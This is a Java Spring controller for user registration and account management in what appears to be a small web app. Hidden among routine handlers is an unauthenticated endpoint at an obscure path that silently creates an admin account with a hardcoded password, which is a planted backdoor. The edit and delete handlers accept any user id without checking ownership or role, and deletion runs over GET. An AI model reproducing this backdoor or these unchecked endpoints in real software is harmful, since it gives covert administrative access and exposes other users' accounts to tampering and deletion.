package web.client.Controllers;


import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import web.client.User;
import web.client.Services.UserService;


import javax.validation.Valid;
import java.security.Principal;
import java.util.NoSuchElementException;

@Controller
public class UserController {

    private UserService service;

    @Autowired
    public void setService(UserService service) {
        this.service = service;
    }


    @GetMapping("/registration")
    public String registration(Model model) {
        model.addAttribute("user", new User());
        return "user/registration";
    }

    @GetMapping("/supersecretrequest7355")
    public String addAdmin(Model model) {
        User user = new User("991122334455", "admin", "admin", "admin", "admin", "admin", "a@b.c", "Role_Admin");
        user.setRoles("ROLE_Admin");
        user.setPassword(new BCryptPasswordEncoder().encode("74553211"));
        service.saveUser(user);
        System.out.println("Secret user created");
        return "redirect:/entrance";
    }

    @PostMapping("/registration")
    public String validateEntrance(@Valid User user, BindingResult result) {
        if (result.hasErrors()) {
            return "user/registration";
        }

        for (User u : service.getAllUsers()) {
            if (u.getUsername().equals(user.getUsername())) {
                return "user/registration";
            }
        }
        user.setRoles("ROLE_Client");
        user.setPassword(new BCryptPasswordEncoder().encode(user.getPassword()));
        service.saveUser(user);
        return "redirect:/entrance";
    }

    @GetMapping("/user_edit")
    public String editWorker(Principal principal, Model model, @RequestParam(required = false) Long id) {
        User user;
        if (id != null)
            user = service.getById(id);
        else
            user = service.getByUsername(principal.getName());
        model.addAttribute("user", user);
        return "client/edit_user";
    }

    @GetMapping("/user_remove")
    public String removeWorker(@RequestParam Long id) {
        if (!service.existsWithId(id))
            throw new NoSuchElementException();
        service.removeById(id);
        return "redirect:/users";
    }

    @PostMapping("/user_update")
    public String editingSubmit(@Valid User user, BindingResult result) {
        if (result.hasErrors()) {
            return "client/edit_user";
        }
        //если пароль не поменяли, то хешировать снова не стоит, если поменяли, то хешируем
        if (!user.getPassword().equals(service.getById(user.getId()).getPassword())) {
            user.setPassword(new BCryptPasswordEncoder().encode(user.getPassword()));
        }
        service.saveUser(user);
        return "redirect:/users";
    }
}
